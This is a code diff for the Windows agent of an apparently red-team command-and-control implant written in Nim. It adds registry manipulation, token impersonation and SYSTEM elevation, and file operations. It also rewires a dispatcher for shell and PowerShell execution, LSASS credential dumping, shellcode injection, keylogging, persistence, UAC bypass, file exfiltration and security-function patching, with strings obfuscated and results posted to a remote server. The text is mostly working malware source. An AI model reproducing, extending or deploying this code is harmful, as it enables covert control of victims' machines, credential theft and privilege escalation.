@@ -2,9 +2,9 @@
 import ../config
 import ../common
 import utils/incl/[evillsasstwin]
-import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv]
+import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv, token, reg]
 # External imports
-import std/[tables, nativesockets, json]
+import std/[tables, nativesockets, json, strutils]
 import wAuto/[registry, window]
 import winim/[lean, com]
 import system/[io]
@@ -12,7 +12,6 @@ import httpclient
 import threadpool
 import nimprotect
 import strformat
-import strutils
 import osproc
 import crc32
 import net
@@ -26,6 +25,14 @@ proc windows_parse_command*(command: JsonNode): bool
 proc collect_data(): bool
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
 proc spawn_wmi(cmdline: string): bool
+proc wrap_regenumkeys(key: string): bool
+proc wrap_regenumvalues(key: string): bool
+proc wrap_regread(key: string, value: string): bool
+proc wrap_regdelete(key: string): bool
+proc wrap_regdelete(key: string, value: string): bool
+proc wrap_regwrite(key: string): bool
+proc wrap_regwrite(key: string, value: string, data: string): bool
+proc wrap_regwrite(key: string, value: string, data: DWORD): bool
 proc checksec(): bool
 proc wrap_get_clipboard(): bool
 proc enum_visible_windows(): bool
@@ -43,6 +50,7 @@ proc wrap_patch_func(func_name: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string): bool
+proc wrap_token_funcs(token_method: string, pid: int = 0): bool
 proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
 proc wrap_set_critical(is_critical: bool): bool
@@ -164,6 +172,92 @@ proc spawn_wmi(cmdline: string): bool =
     var is_success = post_data(client, protectString("spawn") , $data)
 
     return is_success
+
+
+proc wrap_regenumkeys(key: string): bool =
+    var subkeys = registry_iterate_keys(key)
+    var data = {
+        protectString("key"): key,
+        protectString("subkeys"): "\n" & subkeys
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regenumkeys") , $data)
+
+  
+proc wrap_regenumvalues(key: string): bool =
+    var values = registry_iterate_values(key)
+    var data = {
+        protectString("key"): key,
+        protectString("values"): "\n" & values
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regenumvalues") , $data)
+
+
+proc wrap_regread(key: string, value: string): bool = 
+    var regdata = registry_read(key, value)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("data"): regdata
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regread") , $data)
+
+
+proc wrap_regdelete(key: string): bool =
+    var is_success = registry_delete(key)
+    var data = {
+        protectString("key"): key,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regdelete") , $data)
+
+
+proc wrap_regdelete(key: string, value: string): bool =
+    var is_success = registry_delete(key, value)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regdelete") , $data)
+
+
+proc wrap_regwrite(key: string): bool =
+    var is_success = registry_write(key)
+    var data = {
+        protectString("key"): key,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regwrite") , $data)
+
+
+proc wrap_regwrite(key: string, value: string, data: string): bool =
+    var is_success = registry_write(key, value, data)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("data"): data,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regwrite") , $data)
+
+
+proc wrap_regwrite(key: string, value: string, data: DWORD): bool = 
+    var is_success = registry_write(key, value, data)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("data"): $data,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regwrite") , $data)
 
 
 proc checksec(): bool =
@@ -521,6 +615,29 @@ proc uac_bypass(bypass_method: string, cmd: string): bool =
         return is_success_post
 
 
+proc wrap_token_funcs(token_method: string, pid: int = 0): bool =
+    var is_success: bool
+    var username: string
+
+    case token_method:
+        of protectString("impersonate"):
+            (is_success, username) = impersonate(pid)
+        of protectString("getsys"):
+            is_success = impersonate_system()
+            username = protectString("SYSTEM")
+        of protectString("rev2self"):
+            is_success = rev2self()
+            username = protectString("self")
+
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("impersonated"): username
+    }.toOrderedTable()
+    
+    is_success = post_data(client, protectString("token_method") , $data)
+    return is_success
+
+
 proc msgbox(title: string, text: string) {.gcsafe.} =
     # spawn in a new thread
     MessageBox(0, text, title, 0)
@@ -629,24 +746,48 @@ proc windows_start*(): void =
 proc windows_parse_command*(command: JsonNode): bool =
     var is_success: bool
     var command_type = command[protectString("command_type")].getStr()
-
     case command_type:
         # for external common procs - pass the http client as first argument
         of protectString("cmd"):
-            is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
+            is_success = run_shell_command(client, command[protectString("command")].getStr())
         of protectString("iex"):
             # direct iex
             if not contains(command, protectString("ps_module")):
-                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr())
+                is_success = wrap_execute_encoded_powershell(command[protectString("epc")].getStr())
             # ps_modules
             else:
                 is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command[protectString("ps_module")].getStr())
         of protectString("spawn"):
             is_success = spawn_wmi(command[protectString("cmdline")].getStr())
         of protectString("download"):
-            is_success = exfil_file(client, command[protectString("src_file")].getStr())
+            is_success = exfil_file(client, command[protectString("src")].getStr())
         of protectString("upload"):
-            is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr())            
+            is_success = infil_file(client, command[protectString("src_b64")].getStr(), command[protectString("dst")].getStr())   
+        of protectString("listdir"):
+            is_success = list_dir(client, command[protectString("path")].getStr(), command[protectString("rec")].getBool())     
+        of protectString("fread"):
+            is_success = fread(client, command[protectString("path")].getStr()) 
+        of protectString("fwrite"):
+            is_success = fwrite(client, command[protectString("path")].getStr(), command[protectString("content")].getStr(), command[protectString("append")].getBool())                                  
+        of protectString("fdelete"):
+            is_success = fdelete(client, command[protectString("path")].getStr())
+        of protectString("regenumkeys"):
+            is_success = wrap_regenumkeys(command[protectString("key")].getStr())
+        of protectString("regenumvalues"):
+            is_success = wrap_regenumvalues(command[protectString("key")].getStr())
+        of protectString("regread"):
+            is_success = wrap_regread(command[protectString("key")].getStr(), command[protectString("value")].getStr())
+        of protectString("regdeletekey"):
+            is_success = wrap_regdelete(command[protectString("key")].getStr())
+        of protectString("regdeletevalue"):
+            is_success = wrap_regdelete(command[protectString("key")].getStr(), command[protectString("value")].getStr())
+        of protectString("regwritekey"):
+            is_success = wrap_regwrite(command[protectString("key")].getStr())
+        of protectString("regwritevalue"):
+            if command[protectString("type")].getStr() == "s": # string
+                is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), command[protectString("data")].getStr())
+            elif command[protectString("type")].getStr() == "d": # dword
+                is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), cast[DWORD](command[protectString("data")].getInt()))
         of protectString("checksec"):
             is_success = checksec()
         of protectString("clipboard"):
@@ -656,21 +797,21 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("windows"):
             is_success = enum_visible_windows()
         of protectString("audio"):
-            is_success = wrap_record_audio(command[protectString("record_time")].getInt())
-        of protectString("lsass-examine"):
-            is_success = wrap_examine_lsass()
+            is_success = wrap_record_audio(command[protectString("time")].getInt())
         of protectString("lsass"):
-            var dump_method = command[protectString("dump_method")].getStr()
-            if dump_method == protectString("eviltwin"):
+            var dump_method = command[protectString("subcommand")].getStr()
+            if dump_method == protectString("examine"):
+                is_success = wrap_examine_lsass()
+            elif dump_method == protectString("eviltwin"):
                 is_success = wrap_evil_lsass_twin()
             else:
                 is_success = dump_lsass(dump_method)
         of protectString("shellc"):
-            is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command[protectString("pid")].getInt())
+            is_success = wrap_inject_shellc(command[protectString("sh_b64")].getStr(), command[protectString("pid")].getInt())
         of protectString("assembly"):
-            is_success = wrap_execute_assembly(command[protectString("assembly_base64")].getStr(), command[protectString("assembly_args")].getStr())
+            is_success = wrap_execute_assembly(command[protectString("as_b64")].getStr(), command[protectString("as_args")].getStr())
         of protectString("keylog"):
-            var keylog_action = command[protectString("action")].getStr()
+            var keylog_action = command[protectString("subcommand")].getStr()
             if keylog_action == protectString("start"):
                 is_success = wrap_keylog_start()
             elif keylog_action == protectString("dump"):
@@ -678,13 +819,20 @@ proc windows_parse_command*(command: JsonNode): bool =
             if keylog_action == protectString("stop"):
                 is_success = wrap_keylog_stop()                                
         of protectString("patch"):
-            is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
+            is_success = wrap_patch_func(command[protectString("func")].getStr())
         of protectString("persist-run"):
-            is_success = set_run_key(command[protectString("key_name")].getStr(), command[protectString("persist_command")].getStr())
+            is_success = set_run_key(command[protectString("key")].getStr(), command[protectString("cmd")].getStr())
         of protectString("persist-spe"):
-            is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
+            is_success = set_spe(command[protectString("pn")].getStr(), command[protectString("cmd")].getStr())
         of protectString("uac-bypass"):
-            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr())
+            is_success = uac_bypass(command[protectString("method")].getStr(), command[protectString("cmd")].getStr())
+        of protectString("impersonate"):
+            var pid = command[protectString("pid")].getInt()
+            is_success = wrap_token_funcs(command_type, pid)
+        of protectString("getsys"):
+            is_success = wrap_token_funcs(command_type)
+        of protectString("rev2self"):
+            is_success = wrap_token_funcs(command_type)
         of protectString("msgbox"):
             # spawn in a new thread
             var title = command[protectString("title")].getStr()
@@ -698,9 +846,9 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
         of protectString("critical"):
-            is_success = wrap_set_critical(parseBool(command[protectString("is_critical")].getStr()))
+            is_success = wrap_set_critical(parseBool(command[protectString("is_critical")].getStr()))        
         of protectString("sleep"):
-            is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
+            is_success = change_sleep_time(client, command[protectString("sleep")].getInt(), command[protectString("jitter")].getInt())
         of protectString("collect"):
             is_success = collect_data()
         of protectString("die"):
